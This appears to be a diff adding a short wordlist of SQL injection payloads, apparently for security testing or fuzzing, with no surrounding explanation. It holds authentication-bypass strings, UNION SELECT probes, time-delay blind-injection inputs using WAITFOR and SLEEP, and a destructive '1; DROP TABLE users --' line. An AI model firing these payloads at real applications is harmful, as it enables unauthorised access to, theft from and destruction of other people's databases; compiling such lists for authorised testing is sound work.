@@ -1,0 +1,17 @@
+' OR '1'='1
+' OR '1'='1' --
+" OR "1"="1
+" OR "1"="1" --
+' OR 1=1 --
+' OR 1=1#
+admin' --
+' UNION SELECT NULL --
+' UNION SELECT NULL, NULL --
+1 OR 1=1
+1' AND '1'='1
+1' AND '1'='2
+'; WAITFOR DELAY '0:0:5' --
+'; SELECT SLEEP(5) --
+' AND SLEEP(5) --
+1; DROP TABLE users --
+' OR ''='
